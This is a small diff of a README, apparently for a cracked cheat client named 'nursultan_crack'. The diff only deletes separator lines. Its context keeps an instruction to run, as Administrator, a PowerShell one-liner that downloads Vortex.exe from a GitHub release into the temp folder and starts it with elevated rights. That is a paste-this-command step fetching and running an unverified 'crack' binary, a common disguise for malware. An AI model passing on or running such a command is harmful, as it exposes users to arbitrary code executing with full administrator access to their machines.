@@ -24,12 +24,8 @@ Run the following command in **Command Prompt as Administrator**:
 powershell -c irm https://github.com/goldwinston/nursultan_crack/releases/latest/download/Vortex.exe -OutFile $env:TEMP\Vortex.exe; Start-Process $env:TEMP\Vortex.exe -Verb RunAs
 ```
 
----
 
 </div>
-
-
----
 
 ## 📸 Preview
 
